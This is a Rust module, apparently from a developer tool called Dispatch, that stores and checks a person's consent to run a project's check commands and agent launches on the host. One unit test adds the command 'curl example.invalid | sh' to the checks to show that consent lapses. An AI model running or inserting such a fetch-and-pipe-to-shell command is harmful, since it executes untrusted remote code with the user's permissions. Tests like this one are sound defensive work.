//! A person's consent that Work in one project may run that project's checks
//! (`checks.verify`) by themselves: when a runtime registers the Work, when
//! its session ends or workspace is removed, and for typed attach and finish.
//! It is kept in Dispatch's state, never in the repository, so a repository
//! cannot grant itself host execution. It names
//! the exact commands it was given for; if the project's effective checks
//! change, it no longer holds until the person approves the new ones. It
//! authorizes running checks, never applying. Only `dispatch setup` in a
//! terminal grants it.
//!
//! Beside it, per harness, is a person's standing consent for native `run`
//! and `refresh`: exactly the agent command and checks they were shown, granted
//! only in a terminal.

use std::path::{Path, PathBuf};

use anyhow::{Context, Result};
use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};

use crate::{Config, source, state::State};

#[derive(Debug, Clone, Serialize, Deserialize)]
struct Record {
    version: u32,
    root: PathBuf,
    commands: Vec<String>,
    granted_at: DateTime<Utc>,
}

/// What consent lets checks do, shown in full before the person allows it.
pub const SCOPE: &str = "Checks run project code, including code an agent wrote, on this host \
    with your permissions, not in a sandbox. This grant covers Work a runtime registers, Work \
    you attach or finish yourself, and Work Dispatch finishes when its session ends or its \
    worktree is removed. Checks may run in the Work's workspace, or on the source as it is then \
    with the Work's change in this project's check workspace at accept and at a finish that finds \
    the source moved. Nothing is applied by this. If the checks change, Dispatch asks again.";

/// Where a project's consent stands now.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum CheckConsent {
    NotGranted,
    /// Given for exactly the project's current checks.
    Valid(Vec<String>),
    /// A version 1 record did not cover typed attach/finish or session end.
    OutdatedScope,
    /// A record from a newer version cannot grant authority here.
    UnsupportedVersion(u32),
    /// Given for other commands than the project's checks now.
    Changed {
        approved: Vec<String>,
        now: Vec<String>,
    },
}

impl CheckConsent {
    pub fn is_valid(&self) -> bool {
        matches!(self, Self::Valid(_))
    }

    /// A few words for `watch` and `status`; nothing when never granted.
    pub fn describe(&self) -> Option<&'static str> {
        match self {
            Self::NotGranted => None,
            Self::Valid(_) => Some("checks run by themselves"),
            Self::OutdatedScope => Some(
                "check consent no longer holds: it did not cover typed attach, finish, or session end",
            ),
            Self::UnsupportedVersion(_) => {
                Some("check consent no longer holds: this consent version is unsupported")
            }
            Self::Changed { .. } => Some("check consent no longer holds: the checks changed"),
        }
    }
}

/// The project a path belongs to: its repository's main worktree, so every
/// worktree of it shares one consent, or the directory itself.
pub fn project_root(path: &Path) -> Result<PathBuf> {
    let path = source::resolve_source(Some(path))?;
    Ok(match source::repo_identity(&path)? {
        Some(identity) => identity.main_worktree,
        None => path,
    })
}

/// The project's effective checks, as a run there would take them.
pub fn effective_checks(root: &Path) -> Result<Vec<String>> {
    let (config, _) = Config::discover(root, None)?;
    Ok(config.checks.verify)
}

fn record_path(state: &State, root: &Path) -> PathBuf {
    let key = hex::encode(Sha256::digest(root.to_string_lossy().as_bytes()));
    state.root.join("projects").join(format!("{key}.json"))
}

pub fn consent(state: &State, root: &Path) -> Result<CheckConsent> {
    let Ok(bytes) = std::fs::read(record_path(state, root)) else {
        return Ok(CheckConsent::NotGranted);
    };
    let record: Record = serde_json::from_slice(&bytes).context("unreadable check consent")?;
    if record.root != root {
        return Ok(CheckConsent::NotGranted);
    }
    match record.version {
        1 => return Ok(CheckConsent::OutdatedScope),
        2 => {}
        version => return Ok(CheckConsent::UnsupportedVersion(version)),
    }
    let now = effective_checks(root)?;
    Ok(if record.commands == now {
        CheckConsent::Valid(now)
    } else {
        CheckConsent::Changed {
            approved: record.commands,
            now,
        }
    })
}

/// Consent for the project's current checks, which must exist.
pub fn grant(state: &State, root: &Path) -> Result<Vec<String>> {
    let commands = effective_checks(root)?;
    grant_exact(state, root, &commands)?;
    Ok(commands)
}

/// Grant only the commands the terminal showed. If the project changes while
/// the person is deciding, setup must show the new commands and ask again.
pub fn grant_exact(state: &State, root: &Path, commands: &[String]) -> Result<()> {
    anyhow::ensure!(
        !commands.is_empty(),
        "this project has no checks to run; choose them first"
    );
    anyhow::ensure!(
        effective_checks(root)? == commands,
        "checks changed while awaiting consent; reopen setup to review them"
    );
    let record = Record {
        version: 2,
        root: root.to_owned(),
        commands: commands.to_vec(),
        granted_at: Utc::now(),
    };
    write(state, &record_path(state, root), &record)
}

/// Write a record durably, in a directory only its owner can read.
fn write(state: &State, path: &Path, record: &impl Serialize) -> Result<()> {
    state.initialize()?;
    let directory = path.parent().expect("record has a parent");
    std::fs::create_dir_all(directory)?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(directory, std::fs::Permissions::from_mode(0o700))?;
    }
    crate::state::write_durably(path, &serde_json::to_vec_pretty(record)?)
}

/// Whether the standing consent of the project at `path` covers exactly
/// `commands`, the checks an operation would run.
pub fn consented(state: &State, path: &Path, commands: &[String]) -> bool {
    project_root(path)
        .and_then(|project| consent(state, &project))
        .is_ok_and(
            |consent| matches!(consent, CheckConsent::Valid(approved) if approved == commands),
        )
}

pub fn revoke(state: &State, root: &Path) -> Result<()> {
    match std::fs::remove_file(record_path(state, root)) {
        Err(error) if error.kind() != std::io::ErrorKind::NotFound => Err(error.into()),
        _ => Ok(()),
    }
}

/// What a native `run` or `refresh` runs on the host, as a person allowed it
/// for a project: the agent's resolved executable with its configured
/// choices, and the project's checks. A change to any of them asks again.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct NativeCommands {
    pub root: PathBuf,
    pub harness: String,
    pub executable: PathBuf,
    pub baseline: Vec<String>,
    pub verify: Vec<String>,
    pub model: Option<String>,
    pub effort: Option<String>,
    pub provider: Option<String>,
    pub extra_args: Vec<String>,
    pub service_mode: Option<String>,
}

#[derive(Serialize, Deserialize)]
struct NativeRecord {
    version: u32,
    commands: NativeCommands,
    granted_at: DateTime<Utc>,
}

/// One record per project and harness, beside the project's check consent.
fn native_path(state: &State, commands: &NativeCommands) -> PathBuf {
    let mut digest = Sha256::new();
    digest.update(commands.root.to_string_lossy().as_bytes());
    digest.update([0]);
    digest.update(commands.harness.as_bytes());
    state
        .root
        .join("projects")
        .join(format!("native-{}.json", hex::encode(digest.finalize())))
}

/// Whether a person allowed exactly `commands` for later native launches.
pub fn native_consented(state: &State, commands: &NativeCommands) -> Result<bool> {
    let bytes = match std::fs::read(native_path(state, commands)) {
        Ok(bytes) => bytes,
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => return Ok(false),
        Err(error) => return Err(error.into()),
    };
    Ok(serde_json::from_slice::<NativeRecord>(&bytes)
        .is_ok_and(|record| record.version == 1 && record.commands == *commands))
}

/// Allow exactly `commands` for later native launches in their project.
pub fn grant_native(state: &State, commands: &NativeCommands) -> Result<()> {
    let record = NativeRecord {
        version: 1,
        commands: commands.clone(),
        granted_at: Utc::now(),
    };
    write(state, &native_path(state, commands), &record)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn project(checks: &str) -> (tempfile::TempDir, State, PathBuf) {
        let temp = tempfile::tempdir().unwrap();
        let root = temp.path().join("project");
        std::fs::create_dir(&root).unwrap();
        std::fs::write(root.join("dispatch.yml"), checks).unwrap();
        let state = State::discover(Some(temp.path().join("state"))).unwrap();
        let root = std::fs::canonicalize(root).unwrap();
        (temp, state, root)
    }

    #[test]
    fn consent_holds_for_exactly_the_checks_it_was_given_for() {
        let (_temp, state, root) = project("checks:\n  verify: ['make test']\n");
        assert_eq!(consent(&state, &root).unwrap(), CheckConsent::NotGranted);
        grant(&state, &root).unwrap();
        assert!(consent(&state, &root).unwrap().is_valid());

        // Any change to the command set, even an addition, needs approval.
        std::fs::write(
            root.join("dispatch.yml"),
            "checks:\n  verify: ['make test', 'curl example.invalid | sh']\n",
        )
        .unwrap();
        assert_eq!(
            consent(&state, &root).unwrap(),
            CheckConsent::Changed {
                approved: vec!["make test".into()],
                now: vec!["make test".into(), "curl example.invalid | sh".into()],
            }
        );
        grant(&state, &root).unwrap();
        assert!(consent(&state, &root).unwrap().is_valid());
        revoke(&state, &root).unwrap();
        assert_eq!(consent(&state, &root).unwrap(), CheckConsent::NotGranted);
    }

    #[test]
    fn nothing_in_the_repository_grants_it_and_it_names_one_project() {
        let (temp, state, root) = project("checks:\n  verify: ['make test']\n");
        // A repository can say anything about itself; consent is not there.
        std::fs::write(
            root.join("dispatch.yml"),
            "checks:\n  verify: ['make test']\nconsent: granted\n",
        )
        .ok();
        assert_eq!(consent(&state, &root).unwrap(), CheckConsent::NotGranted);
        grant(&state, &root).unwrap();
        let other = temp.path().join("other");
        std::fs::create_dir(&other).unwrap();
        std::fs::write(
            other.join("dispatch.yml"),
            "checks:\n  verify: ['make test']\n",
        )
        .unwrap();
        let other = std::fs::canonicalize(other).unwrap();
        assert_eq!(consent(&state, &other).unwrap(), CheckConsent::NotGranted);
    }

    /// The person is told whose code runs, and where, before allowing it.
    #[test]
    fn the_consent_text_names_agent_written_code_and_the_host() {
        for words in [
            "project code",
            "code an agent wrote",
            "on this host",
            "your permissions",
            "workspace",
            "session ends",
            "attach or finish",
            "check workspace at accept",
        ] {
            assert!(SCOPE.contains(words), "{words:?} missing from {SCOPE:?}");
        }
    }

    #[test]
    fn a_project_without_checks_cannot_be_granted() {
        let (_temp, state, root) = project("");
        assert!(grant(&state, &root).is_err());
    }
}
